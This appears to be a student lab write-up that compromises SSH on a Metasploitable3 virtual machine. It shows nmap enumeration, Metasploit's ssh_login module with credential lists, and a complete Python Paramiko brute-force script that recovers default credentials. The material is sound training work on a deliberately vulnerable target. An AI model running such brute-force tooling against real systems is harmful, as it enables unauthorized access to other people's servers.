# Phase 1: Setup and Compromise the Service

## Overview

In this phase, we configured two virtual environments to simulate an attack scenario. The target machine (Metasploitable3) was configured with several known vulnerable services, and the attacker machine (Kali Linux) was used to compromise one of these services. The selected service for this phase was **SSH**, which was successfully compromised using both Metasploit and a custom script.

---

## 1. Environment Setup

### 🖥 Victim Environment: Metasploitable3
- **Platform:** VirtualBox on Windows
- **IP Adress**: 192.168.100.138
  ![لقطة شاشة 2025-05-02 175018](https://github.com/user-attachments/assets/94942fcc-b660-42e3-8962-667f8791f449)


-**Vulnerable Services Running:**
We executed the command nmap -sV 192.168.100.138 to perform a service version scan on the target machine. This allowed us to enumerate the active services and identify potential vulnerabilities, ultimately helping us select SSH as the target for exploitation.

![لقطة شاشة 2025-05-02 174655](https://github.com/user-attachments/assets/557cb2b3-9eec-4926-a4d0-caa940052cd1)


### 💻 Attacker Environment: Kali Linuxs
- **Platform:** VirtualBox on Windows
- **IP Adress**: 192.168.100.133
  
![لقطة شاشة 2025-05-02 174402](https://github.com/user-attachments/assets/663c2f26-6c43-4220-9bc8-1f94b2910df6)


#### Tools Used:
- Metasploit Framework
- Nmap
- Hydra
- Python 3 with Paramiko library
    
---

## 2. Selected Vulnerable Service

- **Targeted Service:** SSH (Port 22)  
- **Reason for Selection:** SSH on Metasploitable3 is configured with weak/default credentials, making it vulnerable to brute-force attacks or password reuse exploits.

---

## Service Enumeration

We scanned the target machine using `nmap` to identify open ports and determine which services were running.

Command used:
```
nmap -sV 192.168.56.101
```
![لقطة شاشة 2025-05-02 174655](https://github.com/user-attachments/assets/3e9d89d4-12de-4791-a8d7-7e17c015532c)

## Task 1.1: Compromise Using Metasploit

Steps to exploit the SSH service:

First: Create a file for usernames and passwords: 

![لقطة شاشة 2025-05-02 181530](https://github.com/user-attachments/assets/103cc98c-6273-4264-be51-b00c8f8f042b)

Then, we start to exploit: 
1. Launch Metasploit:
   ```
   msfconsole
   ```
   ![لقطة شاشة 2025-04-29 230224](https://github.com/user-attachments/assets/2c38ce71-aa71-4c33-abf3-d9fe9f5d8b15)

2. Search for the SSH login module:
   ```
   search ssh_login
   ```
3. Use the auxiliary scanner:
   ```
   use auxiliary/scanner/ssh/ssh_login
   ```
4. Configure the module:
   ```
   set RHOSTS 192.168.56.101
   set USER_FILE user.txt
   set PASS_FILE pass.txt
   run
   ```
5. Successful login confirms service compromise.
-Screen shot shown all the above steps:

![لقطة شاشة 2025-05-02 174003](https://github.com/user-attachments/assets/66bba784-ed18-418d-b479-883ae5f121df)

## Task 1.2 – Compromise Using Custom Script

# Custom SSH Brute-Force Script (Python + Paramiko)

We create the python script using 
```
nano ssh_bruteforce.py
```
This script automates brute-force login attempts to the SSH service using combinations from `user.txt` and `pass.txt`.

```python
import paramiko
import time

host = "192.168.100.138"
port = 22
user_file = "/home/bdoor/user.txt"
pass_file = "/home/bdoor/pass.txt"

def try_login(username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=port, username=username, password=password, timeout=5)
        print(f"[+] SUCCESS: {username}:{password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Invalid:  {username}:{password}")
    except paramiko.SSHException as e:
        print(f"[!] SSH Error: {e}")
    except Exception as e:
        print(f"[!] Other Error: {e}")
    return False

with open(user_file, "r") as users:
    for user in users:
        user = user.strip()
        with open(pass_file, "r") as passwords:
            for pwd in passwords:
                pwd = pwd.strip()
                if try_login(user, pwd):
                    exit(0)
                time.sleep(1)  # Wait 1 second to avoid banner issues

```

The script was able to successfully brute-force the SSH credentials. As shown in the last line, it identified the correct username and password combination: vagrant:vagrant.




![لقطة شاشة 2025-05-02 181745](https://github.com/user-attachments/assets/0bd22377-6781-4f6e-8bbc-7b5b4d0df463)


![لقطة شاشة 2025-05-02 181753](https://github.com/user-attachments/assets/d415a8f8-0df2-4979-85a7-52e538e8500d)

---

## 5. Conclusion

We successfully exploited the SSH service running on Metasploitable3 using:
1. **Metasploit**, leveraging known default credentials.
2. A **custom Python script**, automating the brute-force and login process.



